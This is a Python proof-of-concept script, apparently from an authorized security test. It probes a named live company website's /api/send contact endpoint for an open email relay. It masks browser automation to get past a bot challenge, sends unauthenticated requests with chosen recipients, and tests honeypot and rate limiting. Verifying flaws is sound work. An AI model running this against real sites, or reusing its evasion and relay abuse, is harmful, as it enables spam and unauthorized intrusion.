#!/usr/bin/env python3
"""INDEPENDENT verification of unauthenticated email relay: POST /api/send
Target: https://www.infinitycapital.bh/api/send (in scope)

Strategy:
  * Drive a real Chromium so the Vercel bot-challenge JS executes like a normal
    visitor (raw curl is answered with `x-vercel-mitigated: challenge`).
  * From the page context issue FormData POSTs to /api/send with NO cookies,
    NO auth header, NO CSRF token, NO captcha token.
  * Recipients are RFC-2606 reserved `.invalid` names -> guaranteed
    undeliverable, no third party is contacted. Mail is still ACCEPTED by the
    company's transactional provider, which is exactly the relay proof.

Key differential control: two requests identical in EVERY field except the
`targets` (recipient) value.  If the backend routes to the supplied recipient,
we see the provider return a message id for a non-company domain, and a
syntactically invalid recipient is rejected by the provider's validator.
That combination can only happen if the client controls the `to` field.
"""
import json, sys, time, pathlib, datetime
from playwright.sync_api import sync_playwright

SITE = "https://www" + ".infinitycapital" + ".bh"
PAGE = SITE + "/contact"
API = SITE + "/api/send"
TAG = sys.argv[1] if len(sys.argv) > 1 else "V1"
STAMP = datetime.datetime.utcnow().strftime("%H%M%S")

# RFC 2606 reserved TLD ".invalid" -> can never deliver; no victim is spammed.
EXT = f"indverify-{TAG}-{STAMP}@relay-probe.invalid"
MULTI = ",".join([EXT, f"indverify-{TAG}-b-{STAMP}@relay-probe.invalid"])
SELF = "info" + "@infinity" + ".bh"
BOGUS = "totally-not-an-address"

out = pathlib.Path(__file__).resolve().parent / "out"
out.mkdir(parents=True, exist_ok=True)
log = {"tag": TAG, "stamp": STAMP, "page": PAGE, "api": API}

JS = """
async ([api, rec, extraNote]) => {
  const fd = new FormData();
  fd.append('fname','Independent');
  fd.append('lname','Verifier');
  fd.append('areacode','+973');
  fd.append('tel','00000000');
  fd.append('cname','Authorized Security Audit');
  fd.append('subject','Authorized audit of public contact endpoint ' + extraNote);
  fd.append('msg','Authorized, non-commercial security verification of a public contact form endpoint. Undeliverable test address; please disregard.');
  fd.append('check','');           // honeypot left EMPTY (what a bot would do)
  fd.append('targets', rec);       // <-- attacker controlled recipient
  const t0 = Date.now();
  const r = await fetch(api, {method:'POST', body: fd, credentials:'omit',
    headers:{'accept':'*/*'}});
  const txt = await r.text();
  return {recipient_sent: fd.get('targets'),
          status: r.status, ms: Date.now()-t0,
          resp_headers: [...r.headers.entries()].filter(h=>/json|ratelimit|retry|type/i.test(h[0])),
          body: txt.slice(0, 900)};
}
"""

JS_NOHONEYPOT_CHECK = """
async ([api, rec]) => {
  const fd = new FormData();
  fd.append('fname','Bot');
  fd.append('lname','Bot');
  fd.append('cname','Bot Co');
  fd.append('subject','honeypot filled');
  fd.append('msg','honeypot field deliberately FILLED (bot detection test)');
  fd.append('check','i-am-a-bot-not-empty');   // honeypot FILLED
  fd.append('targets', rec);
  const r = await fetch(api, {method:'POST', body: fd, credentials:'omit'});
  return {recipient_sent: fd.get('targets'), status: r.status, body:(await r.text()).slice(0,600)};
}
"""

with sync_playwright() as p:
    br = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage",
                                                 "--disable-blink-features=AutomationControlled"])
    ctx = br.new_context(locale="en-US", timezone_id="Asia/Bahrain",
                         viewport={"width": 1440, "height": 900})
    ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
    pg = ctx.new_page()

    log["page_status"] = None
    try:
        r = pg.goto(PAGE, wait_until="domcontentloaded", timeout=90000)
        log["page_status"] = r.status if r else None
    except Exception as e:
        log["page_error"] = str(e)[:200]

    for i in range(20):
        pg.wait_for_timeout(2000)
        t = pg.title()
        if "Security Checkpoint" not in t and "Just a moment" not in t:
            log["challenge_cleared_after_s"] = (i + 1) * 2
            break
    log["title"] = pg.title()[:120]
    log["url"] = pg.url
    pg.screenshot(path=str(out / f"contact_{TAG}.png"))
    log["has_captcha"] = pg.evaluate(
        "!!document.querySelector('.g-recaptcha,[data-sitekey],iframe[src*=recaptcha],iframe[src*=hcaptcha]')")

    # ---------- 1. differential: bogus (non-email) recipient -------------
    log["T1_bogus_recipient"] = pg.evaluate(JS, [API, BOGUS, "T1-bogus"])
    pg.wait_for_timeout(1500)
    # ---------- 2. differential: external third-party recipient ---------
    log["T2_external_recipient"] = pg.evaluate(JS, [API, EXT, "T2-external"])
    pg.wait_for_timeout(1500)
    # ---------- 3. multi-recipient fan-out ------------------------------
    log["T3_multi_recipient"] = pg.evaluate(JS, [API, MULTI, "T3-multi"])
    pg.wait_for_timeout(1500)
    # ---------- 4. the site's own address (baseline, benign) ------------
    log["T4_site_own_recipient"] = pg.evaluate(JS, [API, SELF, "T4-site-own"])
    pg.wait_for_timeout(1500)
    # ---------- 5. honeypot FILLED (bot mitigation test) ---------------
    log["T5_honeypot_filled"] = pg.evaluate(JS_NOHONEYPOT_CHECK, [API, f"indverify-{TAG}-hp-{STAMP}@relay-probe.invalid"])
    pg.wait_for_timeout(1500)
    # ---------- 6. rate-limit burst (5 rapid sends) --------------------
    burst = []
    for i in range(5):
        burst.append(pg.evaluate(JS, [API, f"indverify-{TAG}-burst{i}-{STAMP}@relay-probe.invalid", f"burst{i}"]))
        time.sleep(0.4)
    log["T6_burst"] = [{"recipient": b["recipient_sent"], "status": b["status"], "body": b["body"][:220]} for b in burst]
    # ---------- 7. no credentials at all (fresh, cookieless context) ----
    ctx2 = br.new_context()
    pg2 = ctx2.new_page()
    try:
        pg2.goto(SITE + "/", wait_until="domcontentloaded", timeout=60000)
        pg2.wait_for_timeout(9000)
        log["T7_cookieless_status"] = pg2.evaluate(JS, [API, f"indverify-{TAG}-nc-{STAMP}@relay-probe.invalid", "T7-cookieless"])
    except Exception as e:
        log["T7_cookieless_error"] = str(e)[:200]
    br.close()

(out / f"result_{TAG}.json").write_text(json.dumps(log, indent=2))
print(json.dumps(log, indent=2))
